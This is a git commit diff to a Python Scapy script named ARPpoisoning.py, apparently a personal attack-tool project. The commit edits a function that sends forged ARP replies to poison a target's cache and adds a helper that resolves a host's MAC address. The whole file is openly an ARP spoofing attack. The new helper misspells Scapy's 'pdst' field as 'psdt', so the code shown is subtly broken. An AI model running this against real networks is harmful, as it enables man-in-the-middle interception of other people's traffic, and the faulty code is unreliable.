846d5ab4dc1acd28b9bfc10495203b1b8989669c
LvBaren <131879536+LvBaren@users.noreply.github.com>
2025-05-16 10:15:09 +0200

    get the MAC adress

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -22,6 +22,18 @@ def network_scan(ip):
 
 # (1.) Start the poisoning attack by sending fake ARP replies.
 def poison(target_ip, poison_ip, target_mac):
-    fake_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poison_ip, hwsrc=spoof_mac)
+    fake_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poison_ip)
     send(fake_packet, verbose=False)
+
+# (2.) Get the MAC adress of a given IP adress
+def get_mac(ip):
+    # First we do the same as in network scan.
+    arp = scapy.ARP(psdt=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = broadcast / arp
+    packet_pairs = srp(packet, timeout=2, verbose=False)[0]
+    # Now get MAC adress if something replies
+    for sent, received in packet_pairs:
+        return received.hwsrc
+    return None
 
